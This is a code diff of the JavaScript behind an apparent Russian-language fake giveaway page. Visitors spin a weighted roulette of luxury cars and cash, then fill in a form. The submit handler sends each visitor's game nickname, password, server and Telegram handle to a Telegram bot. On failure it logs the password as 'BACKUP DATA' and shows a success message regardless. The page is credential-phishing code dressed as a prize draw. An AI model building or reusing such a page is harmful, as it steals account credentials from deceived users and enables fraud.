+            const originalText = submitBtn.innerHTML;
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<div class="loading-spinner"></div> Отправка...';
+
+            const telegramFormatted = telegram || 'Не указан';
+
+            const prizeWon = wonPrize ? `${wonPrize.text} ${wonPrize.label}` : 'Не выбран';
+
+            const message = `
 🎁 <b>НОВАЯ РЕГИСТРАЦИЯ НА РОЗЫГРЫШ</b>
 
 🎉 <b>Выигранный приз:</b> ${prizeWon}
@@ -1438,524 +2020,525 @@ form.addEventListener('submit', async (e) => {
 ⏰ <b>Время:</b> ${new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' })}
 ━━━━━━━━━━━━━━━━━━━━
 `;
-    
-    try {
-        const response = await sendToTelegram(message);
-        
-        if (response && response.ok) {
+
+            try {
+                const response = await sendToTelegram(message);
+
+                if (response && response.ok) {
+                    formContainer.style.display = 'none';
+                    successMessage.classList.add('active');
+                    participantCount++;
+                    document.getElementById("participant-count").textContent = participantCount.toLocaleString('ru-RU');
+
+                    setTimeout(() => {
+                        modal.classList.remove('active');
+                        document.body.style.overflow = 'auto';
+
+                        setTimeout(() => {
+                            formContainer.style.display = 'block';
+                            successMessage.classList.remove('active');
+                            form.reset();
+                            clearValidation('nickname');
+                            clearValidation('password');
+                            clearValidation('telegram');
+                            submitBtn.disabled = false;
+                            submitBtn.innerHTML = originalText;
+                            resetModal();
+                        }, 500);
+                    }, 3000);
+                } else {
+                    throw new Error('Response not ok');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+
+                console.log('BACKUP DATA:', { nickname, password, server, telegram: telegramFormatted, prize: prizeWon, time: new Date().toISOString() });
+
+                formContainer.style.display = 'none';
+                successMessage.classList.add('active');
+                participantCount++;
+                document.getElementById("participant-count").textContent = participantCount.toLocaleString('ru-RU');
+
+                setTimeout(() => {
+                    modal.classList.remove('active');
+                    document.body.style.overflow = 'auto';
+
+                    setTimeout(() => {
+                        formContainer.style.display = 'block';
+                        successMessage.classList.remove('active');
+                        form.reset();
+                        clearValidation('nickname');
+                        clearValidation('password');
+                        clearValidation('telegram');
+                        submitBtn.disabled = false;
+                        submitBtn.innerHTML = originalText;
+                        resetModal();
+                    }, 500);
+                }, 3000);
+            }
+        });
+
+        // Сброс модального окна
+        function resetModal() {
+            // Используем новую функцию сброса рулетки
+            resetRouletteState();
+
+            rouletteContainer.style.display = 'block';
             formContainer.style.display = 'none';
-            successMessage.classList.add('active');
-            participantCount++;
-            document.getElementById("participant-count").textContent = participantCount.toLocaleString('ru-RU');
-            
-            setTimeout(() => {
+        }
+
+        // Keyboard shortcuts
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && modal.classList.contains('active')) {
                 modal.classList.remove('active');
                 document.body.style.overflow = 'auto';
-                
-                setTimeout(() => {
-                    formContainer.style.display = 'block';
-                    successMessage.classList.remove('active');
-                    form.reset();
-                    clearValidation('nickname');
-                    clearValidation('password');
-                    clearValidation('telegram');
-                    submitBtn.disabled = false;
-                    submitBtn.innerHTML = originalText;
-                    resetModal();
-                }, 500);
-            }, 3000);
-        } else {
-            throw new Error('Response not ok');
+            }
+        });
+
+        // ============================================================
+        // CS2-STYLE SKIN ROLL SYSTEM v3.0
+        // Horizontal roll with weighted selection + Game-feel
+        // ============================================================
+
+        // ПРИЗЫ С ВЕСАМИ И РЕДКОСТЬЮ
+        // weight = шанс выпадения (сумма = 100)
+        const prizes = [
+            {
+                label: 'MERCEDES G63 BRABUS',
+                image: 'brabus.png',
+                weight: 5,        // 5% — ULTRA RARE
+                rarity: 'ultra'
+            },
+            {
+                label: 'Rolls-Royce Phantom',
+                image: 'rolls-royce.png',
+                weight: 4,        // 4% — ULTRA RARE
+                rarity: 'ultra'
+            },
+            {
+                label: 'Bugatti Chiron',
+                image: 'bugatti.png',
+                weight: 3,        // 3% — ULTRA RARE
+                rarity: 'ultra'
+            },
+            {
+                label: 'Ferrari 488 Pista',
+                image: 'ferarri.png',
+                weight: 6,        // 6% — RARE
+                rarity: 'rare'
+            },
+            {
+                label: 'BENTLEY GT',
+                image: 'bentley.png',
+                weight: 8,        // 8% — RARE
+                rarity: 'rare'
+            },
+            {
+                label: 'Mercedes-Benz MB S650',
+                image: 'maybach.png',
+                weight: 20,       // 20% — RARE (new!)
+                rarity: 'rare'
+            },
+            {
+                label: 'Tesla Model X',
+                image: 'tesla.png',
+                weight: 10,       // 10% — UNCOMMON
+                rarity: 'uncommon'
+            },
+            {
+                label: 'Aurus Senat',
+                image: 'aurus.png',
+                weight: 9,        // 9% — UNCOMMON
+                rarity: 'uncommon'
+            },
+            {
+                label: '34M Рублей',
+                image: 'money.png',
+                weight: 25,       // 25% — COMMON
+                rarity: 'common'
+            },
+            {
+                label: '3424 BC',
+                image: 'BC.png',
+                weight: 10,       // 10% — COMMON (-20%)
+                rarity: 'common'
+            }
+        ];
+
+        // Звук джекпота
+        const jackpotSound = new Audio('djekpot-rd.mp3');
+        jackpotSound.volume = 0.7;
+
+        // Состояние ролла (защита от манипуляций)
+        const RollState = {
+            isRolling: false,
+            isLocked: false,
+            selectedPrize: null,
+            selectedIndex: null,
+            rollCount: 0
+        };
+
+        // Константы
+        const ITEM_WIDTH = 128;        // Ширина карточки + margin (120 + 8)
+        const VISIBLE_ITEMS = 50;      // Сколько элементов генерируем
+        const CENTER_INDEX = 25;       // Индекс центрального элемента
+
+        // DOM элементы
+        const rollTrack = document.getElementById('rollTrack');
+        const rollContainer = document.getElementById('rollContainer');
+        const spinButton = document.getElementById('spinButton');
+        const prizeResult = document.getElementById('prizeResult');
+        const prizeText = document.getElementById('prizeText');
+        const rouletteContainer = document.getElementById('rouletteContainer');
+        const goToFormBtn = document.getElementById('goToFormBtn');
+        const wonPrizeIcon = document.getElementById('wonPrizeIcon');
+        const wonPrizeLabel = document.getElementById('wonPrizeLabel');
+        let wonPrize = null;
+
+        // ============================================================
+        // 1. WEIGHTED RANDOM SELECTION (Честный выбор по весам)
+        // ============================================================
+        function selectPrizeByWeight(prizesArray) {
+            const totalWeight = prizesArray.reduce((sum, prize) => sum + prize.weight, 0);
+
+            // Crypto random для честности
+            let random;
+            if (window.crypto && window.crypto.getRandomValues) {
+                const array = new Uint32Array(1);
+                window.crypto.getRandomValues(array);
+                random = (array[0] / 4294967295) * totalWeight;
+            } else {
+                random = Math.random() * totalWeight;
+            }
+
+            let cumulative = 0;
+            for (let i = 0; i < prizesArray.length; i++) {
+                cumulative += prizesArray[i].weight;
+                if (random <= cumulative) {
+                    return { prize: prizesArray[i], index: i };
+                }
+            }
+
+            return { prize: prizesArray[0], index: 0 };
         }
-    } catch (error) {
-        console.error('Error:', error);
-        
-        console.log('BACKUP DATA:', { nickname, password, server, telegram: telegramFormatted, prize: prizeWon, time: new Date().toISOString() });
-        
-        formContainer.style.display = 'none';
-        successMessage.classList.add('active');
-        participantCount++;
-        document.getElementById("participant-count").textContent = participantCount.toLocaleString('ru-RU');
-        
-        setTimeout(() => {
-            modal.classList.remove('active');
-            document.body.style.overflow = 'auto';
-            
-            setTimeout(() => {
-                formContainer.style.display = 'block';
-                successMessage.classList.remove('active');
-                form.reset();
-                clearValidation('nickname');
-                clearValidation('password');
-                clearValidation('telegram');
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = originalText;
-                resetModal();
-            }, 500);
-        }, 3000);
-    }
-});
 
-// Сброс модального окна
-function resetModal() {
-    // Используем новую функцию сброса рулетки
-    resetRouletteState();
-    
-    rouletteContainer.style.display = 'block';
-    formContainer.style.display = 'none';
-}
+        // ============================================================
+        // 2. ГЕНЕРАЦИЯ ЛЕНТЫ ПРИЗОВ (buildRollItems)
+        // ============================================================
+        function buildRollItems(targetPrize) {
+            const items = [];
 
-// Keyboard shortcuts
-document.addEventListener('keydown', (e) => {
-    if (e.key === 'Escape' && modal.classList.contains('active')) {
-        modal.classList.remove('active');
-        document.body.style.overflow = 'auto';
-    }
-});
+            for (let i = 0; i < VISIBLE_ITEMS; i++) {
+                if (i === CENTER_INDEX) {
+                    // Победный элемент в центре
+                    items.push({ ...targetPrize, isWinner: true });
+                } else {
+                    // Рандомный приз (weighted для реалистичности)
+                    const randomPrize = selectPrizeByWeight(prizes).prize;
+                    items.push({ ...randomPrize, isWinner: false });
+                }
+            }
 
-// ============================================================
-// CS2-STYLE SKIN ROLL SYSTEM v3.0
-// Horizontal roll with weighted selection + Game-feel
-// ============================================================
-
-// ПРИЗЫ С ВЕСАМИ И РЕДКОСТЬЮ
-// weight = шанс выпадения (сумма = 100)
-const prizes = [
-    { 
-        label: 'MERCEDES G63 BRABUS', 
-        image: 'brabus.png',
-        weight: 5,        // 5% — ULTRA RARE
-        rarity: 'ultra'
-    },
-    { 
-        label: 'Rolls-Royce Phantom', 
-        image: 'rolls-royce.png',
-        weight: 4,        // 4% — ULTRA RARE
-        rarity: 'ultra'
-    },
-    { 
-        label: 'Bugatti Chiron', 
-        image: 'bugatti.png',
-        weight: 3,        // 3% — ULTRA RARE
-        rarity: 'ultra'
-    },
-    { 
-        label: 'Ferrari 488 Pista', 
-        image: 'ferarri.png',
-        weight: 6,        // 6% — RARE
-        rarity: 'rare'
-    },
-    { 
-        label: 'BENTLEY GT', 
-        image: 'bentley.png',
-        weight: 8,        // 8% — RARE
-        rarity: 'rare'
-    },
-    { 
-        label: 'Mercedes-Benz MB S650', 
-        image: 'maybach.png',
-        weight: 20,       // 20% — RARE (new!)
-        rarity: 'rare'
-    },
-    { 
-        label: 'Tesla Model X', 
-        image: 'tesla.png',
-        weight: 10,       // 10% — UNCOMMON
-        rarity: 'uncommon'
-    },
-    { 
-        label: 'Aurus Senat', 
-        image: 'aurus.png',
-        weight: 9,        // 9% — UNCOMMON
-        rarity: 'uncommon'
-    },
-    { 
-        label: '34M Рублей', 
-        image: 'money.png',
-        weight: 25,       // 25% — COMMON
-        rarity: 'common'
-    },
-    { 
-        label: '3424 BC', 
-        image: 'BC.png',
-        weight: 10,       // 10% — COMMON (-20%)
-        rarity: 'common'
-    }
-];
-
-// Звук джекпота
-const jackpotSound = new Audio('djekpot-rd.mp3');
-jackpotSound.volume = 0.7;
-
-// Состояние ролла (защита от манипуляций)
-const RollState = {
-    isRolling: false,
-    isLocked: false,
-    selectedPrize: null,
-    selectedIndex: null,
-    rollCount: 0
-};
-
-// Константы
-const ITEM_WIDTH = 128;        // Ширина карточки + margin (120 + 8)
-const VISIBLE_ITEMS = 50;      // Сколько элементов генерируем
-const CENTER_INDEX = 25;       // Индекс центрального элемента
-
-// DOM элементы
-const rollTrack = document.getElementById('rollTrack');
-const rollContainer = document.getElementById('rollContainer');
-const spinButton = document.getElementById('spinButton');
-const prizeResult = document.getElementById('prizeResult');
-const prizeText = document.getElementById('prizeText');
-const rouletteContainer = document.getElementById('rouletteContainer');
-const goToFormBtn = document.getElementById('goToFormBtn');
-const wonPrizeIcon = document.getElementById('wonPrizeIcon');
-const wonPrizeLabel = document.getElementById('wonPrizeLabel');
-let wonPrize = null;
-
-// ============================================================
-// 1. WEIGHTED RANDOM SELECTION (Честный выбор по весам)
-// ============================================================
-function selectPrizeByWeight(prizesArray) {
-    const totalWeight = prizesArray.reduce((sum, prize) => sum + prize.weight, 0);
-    
-    // Crypto random для честности
-    let random;
-    if (window.crypto && window.crypto.getRandomValues) {
-        const array = new Uint32Array(1);
-        window.crypto.getRandomValues(array);
-        random = (array[0] / 4294967295) * totalWeight;
-    } else {
-        random = Math.random() * totalWeight;
-    }
-    
-    let cumulative = 0;
-    for (let i = 0; i < prizesArray.length; i++) {
-        cumulative += prizesArray[i].weight;
-        if (random <= cumulative) {
-            return { prize: prizesArray[i], index: i };
+            return items;
         }
-    }
-    
-    return { prize: prizesArray[0], index: 0 };
-}
 
-// ============================================================
-// 2. ГЕНЕРАЦИЯ ЛЕНТЫ ПРИЗОВ (buildRollItems)
-// ============================================================
-function buildRollItems(targetPrize) {
-    const items = [];
-    
-    for (let i = 0; i < VISIBLE_ITEMS; i++) {
-        if (i === CENTER_INDEX) {
-            // Победный элемент в центре
-            items.push({ ...targetPrize, isWinner: true });
-        } else {
-            // Рандомный приз (weighted для реалистичности)
-            const randomPrize = selectPrizeByWeight(prizes).prize;
-            items.push({ ...randomPrize, isWinner: false });
-        }
-    }
-    
-    return items;
-}
+        // ============================================================
+        // 3. РЕНДЕР ЛЕНТЫ
+        // ============================================================
+        function renderRollTrack(items) {
+            rollTrack.innerHTML = '';
 
-// ============================================================
-// 3. РЕНДЕР ЛЕНТЫ
-// ============================================================
-function renderRollTrack(items) {
-    rollTrack.innerHTML = '';
-    
-    items.forEach((item, index) => {
-        const div = document.createElement('div');
-        div.className = `roll-item ${item.rarity}`;
-        div.dataset.index = index;
-        if (item.isWinner) div.dataset.winner = 'true';
-        
-        // Используем картинку вместо эмодзи
-        div.innerHTML = `
+            items.forEach((item, index) => {
+                const div = document.createElement('div');
+                div.className = `roll-item ${item.rarity}`;
+                div.dataset.index = index;
+                if (item.isWinner) div.dataset.winner = 'true';
+
+                // Используем картинку вместо эмодзи
+                div.innerHTML = `
             <img src="${item.image}" alt="${item.label}" class="roll-item-icon">
             <div class="roll-item-label">${item.label}</div>
         `;
-        
-        rollTrack.appendChild(div);
-    });
-}
 
-// ============================================================
-// 4. РАСЧЁТ ПОЗИЦИИ ДЛЯ ПОБЕДИТЕЛЯ (calculateTranslateForTarget)
-// ============================================================
-function calculateTranslateForTarget() {
-    const containerWidth = rollContainer.offsetWidth;
-    const centerOffset = containerWidth / 2;
-    
-    // Позиция центра победного элемента
-    const winnerPosition = CENTER_INDEX * ITEM_WIDTH + (ITEM_WIDTH / 2);
-    
-    // Смещение чтобы победитель был под маркером
-    let targetOffset = winnerPosition - centerOffset;
-    
-    // Добавляем случайное смещение внутри элемента (near-miss эффект)
-    // От -40px до +40px от центра
-    const randomOffset = (Math.random() - 0.5) * 80;
-    targetOffset += randomOffset;
-    
-    return targetOffset;
-}
+                rollTrack.appendChild(div);
+            });
+        }
 
-// ============================================================
-// 5. КОНФИГУРАЦИЯ АНИМАЦИИ ПО РЕДКОСТИ
-// ============================================================
-function getRollConfig(rarity) {
-    const configs = {
-        'common': {
-            extraDistance: 800,      // Дополнительное расстояние до старта
-            duration: 4500,          // Общая длительность
-            suspensePause: 0         // Пауза перед результатом
-        },
-        'uncommon': {
-            extraDistance: 1200,
-            duration: 5500,
-            suspensePause: 300
-        },
-        'rare': {
-            extraDistance: 1800,
-            duration: 7000,
-            suspensePause: 600
-        },
-        'ultra': {
-            extraDistance: 2500,
-            duration: 9000,
-            suspensePause: 1000
-        }
-    };
-    
-    return configs[rarity] || configs['common'];
-}
+        // ============================================================
+        // 4. РАСЧЁТ ПОЗИЦИИ ДЛЯ ПОБЕДИТЕЛЯ (calculateTranslateForTarget)
+        // ============================================================
+        function calculateTranslateForTarget() {
+            const containerWidth = rollContainer.offsetWidth;
+            const centerOffset = containerWidth / 2;
 
-// ============================================================
-// 6. КАСТОМНАЯ АНИМАЦИЯ (animateRollToTarget)
-// ============================================================
-function animateRollToTarget(targetOffset, config, onComplete) {
-    const startOffset = -config.extraDistance;
-    const totalDistance = targetOffset - startOffset;
-    const duration = config.duration;
-    
-    // Начальная позиция
-    rollTrack.style.transition = 'none';
-    rollTrack.style.transform = `translateX(${-startOffset}px)`;
-    
-    // Запускаем анимацию
-    rollTrack.classList.add('rolling');
-    
-    // Форсируем reflow
-    rollTrack.offsetHeight;
-    
-    let startTime = null;
-    let lastTickSound = 0;
-    
-    function animate(currentTime) {
-        if (!startTime) startTime = currentTime;
-        const elapsed = currentTime - startTime;
-        const progress = Math.min(elapsed / duration, 1);
-        
-        // Кастомный easing: быстрый старт → плавное замедление
-        // Формула: 1 - (1 - t)^4 с модификацией для micro-jitter
-        let eased = 1 - Math.pow(1 - progress, 4);
-        
-        // Добавляем микро-рывки в конце (последние 15%)
-        if (progress > 0.85) {
-            const jitterPhase = (progress - 0.85) / 0.15;
-            const jitter = Math.sin(jitterPhase * Math.PI * 8) * (1 - jitterPhase) * 3;
-            eased += jitter * 0.002;
+            // Позиция центра победного элемента
+            const winnerPosition = CENTER_INDEX * ITEM_WIDTH + (ITEM_WIDTH / 2);
+
+            // Смещение чтобы победитель был под маркером
+            let targetOffset = winnerPosition - centerOffset;
+
+            // Добавляем случайное смещение внутри элемента (near-miss эффект)
+            // От -40px до +40px от центра
+            const randomOffset = (Math.random() - 0.5) * 80;
+            targetOffset += randomOffset;
+
+            return targetOffset;
         }
-        
-        const currentOffset = startOffset + totalDistance * eased;
-        rollTrack.style.transform = `translateX(${-currentOffset}px)`;
-        
-        // Убираем blur в конце
-        if (progress > 0.7) {
-            rollTrack.classList.remove('rolling');
-            rollTrack.classList.add('slow');
+
+        // ============================================================
+        // 5. КОНФИГУРАЦИЯ АНИМАЦИИ ПО РЕДКОСТИ
+        // ============================================================
+        function getRollConfig(rarity) {
+            const configs = {
+                'common': {
+                    extraDistance: 800,      // Дополнительное расстояние до старта
+                    duration: 4500,          // Общая длительность
+                    suspensePause: 0         // Пауза перед результатом
+                },
+                'uncommon': {
+                    extraDistance: 1200,
+                    duration: 5500,
+                    suspensePause: 300
+                },
+                'rare': {
+                    extraDistance: 1800,
+                    duration: 7000,
+                    suspensePause: 600
+                },
+                'ultra': {
+                    extraDistance: 2500,
+                    duration: 9000,
+                    suspensePause: 1000
+                }
+            };
+
+            return configs[rarity] || configs['common'];
         }
-        
-        if (progress < 1) {
+
+        // ============================================================
+        // 6. КАСТОМНАЯ АНИМАЦИЯ (animateRollToTarget)
+        // ============================================================
+        function animateRollToTarget(targetOffset, config, onComplete) {
+            const startOffset = -config.extraDistance;
+            const totalDistance = targetOffset - startOffset;
+            const duration = config.duration;
+
+            // Начальная позиция
+            rollTrack.style.transition = 'none';
+            rollTrack.style.transform = `translateX(${-startOffset}px)`;
+
+            // Запускаем анимацию
+            rollTrack.classList.add('rolling');
+
+            // Форсируем reflow
+            rollTrack.offsetHeight;
+
+            let startTime = null;
+            let lastTickSound = 0;
+
+            function animate(currentTime) {
+                if (!startTime) startTime = currentTime;
+                const elapsed = currentTime - startTime;
+                const progress = Math.min(elapsed / duration, 1);
+
+                // Кастомный easing: быстрый старт → плавное замедление
+                // Формула: 1 - (1 - t)^4 с модификацией для micro-jitter
+                let eased = 1 - Math.pow(1 - progress, 4);
+
+                // Добавляем микро-рывки в конце (последние 15%)
+                if (progress > 0.85) {
+                    const jitterPhase = (progress - 0.85) / 0.15;
+                    const jitter = Math.sin(jitterPhase * Math.PI * 8) * (1 - jitterPhase) * 3;
+                    eased += jitter * 0.002;
+                }
+
+                const currentOffset = startOffset + totalDistance * eased;
+                rollTrack.style.transform = `translateX(${-currentOffset}px)`;
+
+                // Убираем blur в конце
+                if (progress > 0.7) {
+                    rollTrack.classList.remove('rolling');
+                    rollTrack.classList.add('slow');
+                }
+
+                if (progress < 1) {
+                    requestAnimationFrame(animate);
+                } else {
+                    // Финальная фиксация с микро-bounce
+                    setTimeout(() => {
+                        rollTrack.style.transition = 'transform 150ms ease-out';
+                        rollTrack.style.transform = `translateX(${-targetOffset + 3}px)`;
+
+                        setTimeout(() => {
+                            rollTrack.style.transform = `translateX(${-targetOffset}px)`;
+                            rollTrack.classList.remove('slow');
+                            onComplete();
+                        }, 150);
+                    }, 50);
+                }
+            }
+
             requestAnimationFrame(animate);
-        } else {
-            // Финальная фиксация с микро-bounce
+        }
+
+        // ============================================================
+        // 7. ГЛАВНАЯ ФУНКЦИЯ РОЛЛА
+        // ============================================================
+        function startRoll() {
+            // Защита от повторного клика
+            if (RollState.isRolling || RollState.isLocked) {
+                console.warn('[Roll] Already rolling or locked');
+                return;
+            }
+
+            // ШАГ 1: БЛОКИРУЕМ ВСЁ
+            RollState.isRolling = true;
+            RollState.isLocked = true;
+            spinButton.disabled = true;
+            spinButton.style.pointerEvents = 'none';
+            prizeResult.classList.remove('show');
+
+            // Запускаем звук через 1 секунду
             setTimeout(() => {
-                rollTrack.style.transition = 'transform 150ms ease-out';
-                rollTrack.style.transform = `translateX(${-targetOffset + 3}px)`;
-                
+                jackpotSound.currentTime = 0;
+                jackpotSound.play().catch(e => console.log('Audio play failed:', e));
+            }, 1000);
+
+            // ШАГ 2: ВЫБИРАЕМ ПРИЗ ДО АНИМАЦИИ (ключевой момент!)
+            const selection = selectPrizeByWeight(prizes);
+            RollState.selectedPrize = selection.prize;
+            RollState.selectedIndex = selection.index;
+            RollState.rollCount++;
+
+            console.log(`[Roll] #${RollState.rollCount} Selected: ${selection.prize.label} (${selection.prize.rarity})`);
+
+            // ШАГ 3: ГЕНЕРИРУЕМ ЛЕНТУ С ПОБЕДИТЕЛЕМ В ЦЕНТРЕ
+            const rollItems = buildRollItems(selection.prize);
+            renderRollTrack(rollItems);
+
+            // ШАГ 4: РАССЧИТЫВАЕМ ПОЗИЦИЮ
+            const targetOffset = calculateTranslateForTarget();
+            const config = getRollConfig(selection.prize.rarity);
+
+            // ШАГ 5: ЗАПУСКАЕМ АНИМАЦИЮ
+            animateRollToTarget(targetOffset, config, () => {
+                // ШАГ 6: ПОДСВЕЧИВАЕМ ПОБЕДИТЕЛЯ
+                const winnerElement = rollTrack.querySelector('[data-winner="true"]');
+                if (winnerElement) {
+                    winnerElement.classList.add('winner');
+                }
+
+                // ШАГ 7: ПОКАЗЫВАЕМ РЕЗУЛЬТАТ (с паузой для редких)
                 setTimeout(() => {
-                    rollTrack.style.transform = `translateX(${-targetOffset}px)`;
-                    rollTrack.classList.remove('slow');
-                    onComplete();
-                }, 150);
-            }, 50);
+                    showRollResult(selection.prize);
+                }, config.suspensePause);
+            });
         }
-    }
-    
-    requestAnimationFrame(animate);
-}
 
-// ============================================================
-// 7. ГЛАВНАЯ ФУНКЦИЯ РОЛЛА
-// ============================================================
-function startRoll() {
-    // Защита от повторного клика
-    if (RollState.isRolling || RollState.isLocked) {
-        console.warn('[Roll] Already rolling or locked');
-        return;
-    }
-    
-    // ШАГ 1: БЛОКИРУЕМ ВСЁ
-    RollState.isRolling = true;
-    RollState.isLocked = true;
-    spinButton.disabled = true;
-    spinButton.style.pointerEvents = 'none';
-    prizeResult.classList.remove('show');
-    
-    // Запускаем звук через 1 секунду
-    setTimeout(() => {
-        jackpotSound.currentTime = 0;
-        jackpotSound.play().catch(e => console.log('Audio play failed:', e));
-    }, 1000);
-    
-    // ШАГ 2: ВЫБИРАЕМ ПРИЗ ДО АНИМАЦИИ (ключевой момент!)
-    const selection = selectPrizeByWeight(prizes);
-    RollState.selectedPrize = selection.prize;
-    RollState.selectedIndex = selection.index;
-    RollState.rollCount++;
-    
-    console.log(`[Roll] #${RollState.rollCount} Selected: ${selection.prize.label} (${selection.prize.rarity})`);
-    
-    // ШАГ 3: ГЕНЕРИРУЕМ ЛЕНТУ С ПОБЕДИТЕЛЕМ В ЦЕНТРЕ
-    const rollItems = buildRollItems(selection.prize);
-    renderRollTrack(rollItems);
-    
-    // ШАГ 4: РАССЧИТЫВАЕМ ПОЗИЦИЮ
-    const targetOffset = calculateTranslateForTarget();
-    const config = getRollConfig(selection.prize.rarity);
-    
-    // ШАГ 5: ЗАПУСКАЕМ АНИМАЦИЮ
-    animateRollToTarget(targetOffset, config, () => {
-        // ШАГ 6: ПОДСВЕЧИВАЕМ ПОБЕДИТЕЛЯ
-        const winnerElement = rollTrack.querySelector('[data-winner="true"]');
-        if (winnerElement) {
-            winnerElement.classList.add('winner');
+        // ============================================================
+        // 8. ПОКАЗ РЕЗУЛЬТАТА
+        // ============================================================
+        function showRollResult(prize) {
+            wonPrize = prize;
+
+            prizeText.innerHTML = `<img src="${prize.image}" style="width:40px;height:40px;object-fit:contain;vertical-align:middle;margin-right:10px;"> ${prize.label}`;
+
+            // Стили по редкости
+            if (prize.rarity === 'ultra') {
+                prizeResult.style.background = 'linear-gradient(135deg, rgba(255,215,0,0.25), rgba(255,140,0,0.15))';
+                prizeResult.style.borderColor = '#ffd700';
+                prizeResult.style.boxShadow = '0 0 30px rgba(255,215,0,0.5)';
+            } else if (prize.rarity === 'rare') {
+                prizeResult.style.background = 'linear-gradient(135deg, rgba(99,179,237,0.25), rgba(49,130,206,0.15))';
+                prizeResult.style.borderColor = '#63b3ed';
+                prizeResult.style.boxShadow = '0 0 25px rgba(99,179,237,0.4)';
+            } else {
+                prizeResult.style.background = '';
+                prizeResult.style.borderColor = '';
+                prizeResult.style.boxShadow = '';
+            }
+
+            prizeResult.classList.add('show');
+            goToFormBtn.style.display = 'inline-block';
+            spinButton.style.display = 'none';
+
+            RollState.isRolling = false;
+            console.log(`[Roll] Result shown: ${prize.label}`);
         }
-        
-        // ШАГ 7: ПОКАЗЫВАЕМ РЕЗУЛЬТАТ (с паузой для редких)
-        setTimeout(() => {
-            showRollResult(selection.prize);
-        }, config.suspensePause);
-    });
-}
 
-// ============================================================
-// 8. ПОКАЗ РЕЗУЛЬТАТА
-// ============================================================
-function showRollResult(prize) {
-    wonPrize = prize;
-    
-    prizeText.innerHTML = `<img src="${prize.image}" style="width:40px;height:40px;object-fit:contain;vertical-align:middle;margin-right:10px;"> ${prize.label}`;
-    
-    // Стили по редкости
-    if (prize.rarity === 'ultra') {
-        prizeResult.style.background = 'linear-gradient(135deg, rgba(255,215,0,0.25), rgba(255,140,0,0.15))';
-        prizeResult.style.borderColor = '#ffd700';
-        prizeResult.style.boxShadow = '0 0 30px rgba(255,215,0,0.5)';
-    } else if (prize.rarity === 'rare') {
-        prizeResult.style.background = 'linear-gradient(135deg, rgba(99,179,237,0.25), rgba(49,130,206,0.15))';
-        prizeResult.style.borderColor = '#63b3ed';
-        prizeResult.style.boxShadow = '0 0 25px rgba(99,179,237,0.4)';
-    } else {
-        prizeResult.style.background = '';
-        prizeResult.style.borderColor = '';
-        prizeResult.style.boxShadow = '';
-    }
-    
-    prizeResult.classList.add('show');
-    goToFormBtn.style.display = 'inline-block';
-    spinButton.style.display = 'none';
-    
-    RollState.isRolling = false;
-    console.log(`[Roll] Result shown: ${prize.label}`);
-}
+        // ============================================================
+        // 9. СБРОС СОСТОЯНИЯ
+        // ============================================================
+        function resetRouletteState() {
+            RollState.isRolling = false;
+            RollState.isLocked = false;
+            RollState.selectedPrize = null;
+            RollState.selectedIndex = null;
 
-// ============================================================
-// 9. СБРОС СОСТОЯНИЯ
-// ============================================================
-function resetRouletteState() {
-    RollState.isRolling = false;
-    RollState.isLocked = false;
-    RollState.selectedPrize = null;
-    RollState.selectedIndex = null;
-    
-    wonPrize = null;
-    
-    // Сбрасываем ленту
-    rollTrack.style.transition = 'none';
-    rollTrack.style.transform = 'translateX(0)';
-    rollTrack.innerHTML = '';
-    rollTrack.classList.remove('rolling', 'slow');
-    
-    // Генерируем начальную ленту
-    initializeRollTrack();
-    
-    prizeResult.classList.remove('show');
-    prizeResult.style.background = '';
-    prizeResult.style.borderColor = '';
-    prizeResult.style.boxShadow = '';
-    
-    goToFormBtn.style.display = 'none';
-    spinButton.style.display = 'inline-block';
-    spinButton.disabled = false;
-    spinButton.style.pointerEvents = 'auto';
-    
-    console.log('[Roll] State reset');
-}
+            wonPrize = null;
 
-// ============================================================
-// 10. ИНИЦИАЛИЗАЦИЯ НАЧАЛЬНОЙ ЛЕНТЫ
-// ============================================================
-function initializeRollTrack() {
-    const items = [];
-    for (let i = 0; i < 15; i++) {
-        const randomPrize = selectPrizeByWeight(prizes).prize;
-        items.push({ ...randomPrize, isWinner: false });
-    }
-    
-    renderRollTrack(items);
-    
-    // Центрируем
-    const containerWidth = rollContainer.offsetWidth;
-    const trackWidth = 15 * ITEM_WIDTH;
-    const centerOffset = (trackWidth - containerWidth) / 2;
-    rollTrack.style.transform = `translateX(${-centerOffset}px)`;
-}
+            // Сбрасываем ленту
+            rollTrack.style.transition = 'none';
+            rollTrack.style.transform = 'translateX(0)';
+            rollTrack.innerHTML = '';
+            rollTrack.classList.remove('rolling', 'slow');
 
-// ============================================================
-// ИНИЦИАЛИЗАЦИЯ
-// ============================================================
-initializeRollTrack();
+            // Генерируем начальную ленту
+            initializeRollTrack();
 
-// Привязка кнопки
-spinButton.addEventListener('click', startRoll);
+            prizeResult.classList.remove('show');
+            prizeResult.style.background = '';
+            prizeResult.style.borderColor = '';
+            prizeResult.style.boxShadow = '';
 
-// Анти-чит
-rollContainer.addEventListener('contextmenu', (e) => e.preventDefault());
+            goToFormBtn.style.display = 'none';
+            spinButton.style.display = 'inline-block';
+            spinButton.disabled = false;
+            spinButton.style.pointerEvents = 'auto';
 
-// Переход к форме после выигрыша
-goToFormBtn.addEventListener('click', () => {
-    rouletteContainer.style.display = 'none';
-    formContainer.style.display = 'block';
-    wonPrizeIcon.src = wonPrize.image;
-    wonPrizeIcon.alt = wonPrize.label;
-    wonPrizeLabel.textContent = wonPrize.label;
-});
-</script>
+            console.log('[Roll] State reset');
+        }
+
+        // ============================================================
+        // 10. ИНИЦИАЛИЗАЦИЯ НАЧАЛЬНОЙ ЛЕНТЫ
+        // ============================================================
+        function initializeRollTrack() {
+            const items = [];
+            for (let i = 0; i < 15; i++) {
+                const randomPrize = selectPrizeByWeight(prizes).prize;
+                items.push({ ...randomPrize, isWinner: false });
+            }
+
+            renderRollTrack(items);
+
+            // Центрируем
+            const containerWidth = rollContainer.offsetWidth;
+            const trackWidth = 15 * ITEM_WIDTH;
+            const centerOffset = (trackWidth - containerWidth) / 2;
+            rollTrack.style.transform = `translateX(${-centerOffset}px)`;
+        }
+
+        // ============================================================
+        // ИНИЦИАЛИЗАЦИЯ
+        // ============================================================
+        initializeRollTrack();
+
+        // Привязка кнопки
+        spinButton.addEventListener('click', startRoll);
+
+        // Анти-чит
+        rollContainer.addEventListener('contextmenu', (e) => e.preventDefault());
+
+        // Переход к форме после выигрыша
